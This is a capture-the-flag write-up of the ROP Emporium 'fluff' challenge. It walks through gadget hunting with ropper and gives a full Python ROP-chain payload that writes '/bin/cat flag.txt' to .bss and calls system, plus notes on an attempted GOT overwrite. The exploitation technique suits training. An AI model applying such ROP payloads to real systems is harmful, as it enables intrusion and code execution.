---
title: 06_fluff
categories: [series, rop_emporium]
---

# ROP Emporium fluff

* **Tools:** IDA Free 7.0, gdb-gef, ropper, readelf
* **Prerequistes:** Stack frame
* **Download solution:** [main.py](/assets/series/rop_emporium/main.py)

## Overview

> "The concept here is identical to the write4 challenge. The only difference is we may struggle to find gadgets that will get the job done."

This one has funky `xor` gadgets, but it's still possible to write where we want.

## #Fails
Dear diary,
today I had a lot of fun but also experimented some frustration. I tried several things that didn' work, but in the end I got the flag. It stated with an idea like this: 
because `_fgets()` returns a pointer to the input buffer, I tried to write `/bin/sh` on the stack and then to overwrite the `.got.plt` entry of `_memset()` with the address of `_system()`, and finally to return to `mov rdi, rax; call _memset()`. I seemed to work (at least according to **ps**, and **gdb** indicated the creation of a child process), but I was unable to use this new shell. I tried a second time, replacing `"/bin/sh"` by `"/bin/cat flag.txt"`, but was unable to get the output. In addition, overwritting the `.got.plt` entry of `_memset()` with the one of `_system()` generated a Bus error. I still have to figure out why things went this way, but in the end I opted for an easier solution which is basically the [write4](/posts/ropemporium-write4) challenge with `xor`.
Also, this is the first challenge for which returning to instruction `call system` majestically failed to execute the commandline pointed by `edi`; the fix was to return to `plt.system`.

## Function pwnme()

The function `pwnme()` calls `_fgets()`, and `_fgets()` accepts up to 0x220 input bytes:
```
0x00000000004007EC    mov     rdx, cs:stdin@@GLIBC_2_2_5 ; stream
0x00000000004007F3    lea     rax, [rbp+s]
0x00000000004007F7    mov     esi, 200h       ; n
0x00000000004007FC    mov     rdi, rax        ; s
0x00000000004007FF    call    _fgets
```

## Function usefulFunction():

This function calls `_system()` with `edi` pointing to the string `"/bin/ls"`:
```
0x000000000040080B    mov     edi, offset command ; "/bin/ls"
0x0000000000400810    call    _system
```

## Writeable area

Let's stick with the `.bss` section, 0x30 bytes is large enough to contains the string `"/bin/cat flag.txt_"`:

```bash
readelf --sections fluff
There are 31 section headers, starting at offset 0x1bf8:

Section Headers:
[Nr] Name              Type             Address           Offset
     Size              EntSize          Flags  Link  Info  Align
[...]
[26] .bss              NOBITS           0000000000601060  00001060
     0000000000000030  0000000000000000  WA       0     0     32
[...]
```

## Searching gadgets

We find a memory write gadget:
```bash
ropper --search "mov [%]" -f ../challs/fluff

0x000000000040084e: mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret;
```
Okay, `mov qword ptr [r10], r11` is cool if: 
1. We can control `r10`;
2. we can control `r11`. 

But before that, note the `xor [r10], r12b`: it writes to memory, but if we set `r12b` to 0 (thanks to the `pop r12`), the data at `[r10]` won't change. This also means we could chain the `pop/xor/ret` to decode or restore altered data, similarly to the [badchars](/posts/ropemporium-badchars) challenge.  
Now, let's look for `r10`:
```bash
ropper --search "% r10" -f ../challs/fluff
[...]
0x0000000000400840: xchg r11, r10; pop r15; mov r11d, 0x602050; ret; 
``` 
A nice `xchg r11, r10`. In addition, we note that using this gadget will also execute the instruction `mov r11d, 0x602050`. So, at this point we can control `r10` through `r11`, but we don't fully control `r11`. Can we have a better control on it? Let's check: 
```bash
ropper --search "% r11" -f ../challs/fluff
[...]
0x0000000000400822: xor r11, r11; pop r14; mov edi, 0x601050; ret; 
0x000000000040082f: xor r11, r12; pop r12; mov r13d, 0x604060; ret; 
```
Hm. The `xor r11, r12` adds another level of dependency, but the `pop r12` allows to control the full chain.  
In a nushell:
```
; set r10 = pointer
mov r11d, 0x602050  ; hardcoded constraint
pop r12             ; anything we want
xor r11, r12        ; full control on r11
xchg r11, r10       ; full control on r10
; write to [r10]
mov r11d, 0x602050  ; hardcoded constrain
pop r12             ; anything we want
xor r11, r12        ; thus, also anything we want
mov qword ptr [r10], r11 ; full control on [r10]
```
Finally, we need a gadget to set `edi` to points to the commandline to execute:
```bash
ropper --search "pop ?di" -f fluff
[...]
0x00000000004008c3: pop rdi; ret; 
```

## ROP the things

```python
# Fill buffer
payload = b''
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
payload += b'\x41\x41\x41\x41\x41\x41\x41\x41'
payload += b'\x42\x42\x42\x42\x42\x42\x42\x42'

# Round 1
# set r10 = 0x00601060 (.bss)
payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
payload += b'\x30\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk;ret
payload += b'\x7f\x42\x09\x6e\x2f\x63\x61\x74'  # xorkey 2 (tac/nib/ ^ 602050)
#payload += b'\x7f\x42\x09\x6e\x2f\x73\x68\x00'  # xorkey 2 (\x00hs/nib/ ^ 602050)
payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
payload += b'junk1234'
# set r11="/bin/cat"
payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
payload += b'junk5678'
payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret
payload += b'junk9abc'
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12b

# Round 2
# set r10 = .bss+8
payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
payload += b'\x38\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
payload += b'\x70\x46\x0c\x61\x67\x2e\x74\x78'  # xorkey 2 ("xt.galf " ^ 602050)
payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
payload += b'junk1234'
# set r11=" flag.tx"
payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
payload += b'junk5678'
payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret
payload += b'junk9abc'
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12b

# Round 3
# set r10 = .bss+0x10
payload += b'\x45\x08\x40\x00\x00\x00\x00\x00'  # mov r11, 602050; ret
payload += b'\x32\x08\x40\x00\x00\x00\x00\x00'  # pop r12; mov r13, junk; ret
payload += b'\x20\x30\x00\x00\x00\x00\x00\x00'  # xorkey = 0x3030; (0x602050^0x3030=0x601060)
payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13,junk; ret
payload += b'\x24\x20\x60\x00\x00\x00\x00\x00'  # xorkey 2 (t ^ 602050)
payload += b'\x40\x08\x40\x00\x00\x00\x00\x00'  # xchg r10, r11; pop r15; mov r11, 602050; ret
payload += b'junk1234'
# set r11="t\x00"
payload += b'\x2f\x08\x40\x00\x00\x00\x00\x00'  # xor r11, r12; pop r12; mov r13, junk; ret
payload += b'junk5678'
payload += b'\x4e\x08\x40\x00\x00\x00\x00\x00'  # mov [r10], r11; pop r13; pop r12; xor [r10], r12b, ret
payload += b'junk9abc'
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00'  # neutralize the xor r12b

# call system
payload += b'\xc3\x08\x40\x00\x00\x00\x00\x00'  # pop edi; ret
payload += b'\x60\x10\x60\x00\x00\x00\x00\x00'  # ->"/bin/cat flag.txt"
#payload += b'\x10\x08\x40\x00\x00\x00\x00\x00'  # call _system(): fails but dunno why
payload += b'\xe0\x05\x40\x00\x00\x00\x00\x00'  # plt.system
```
---
EOF
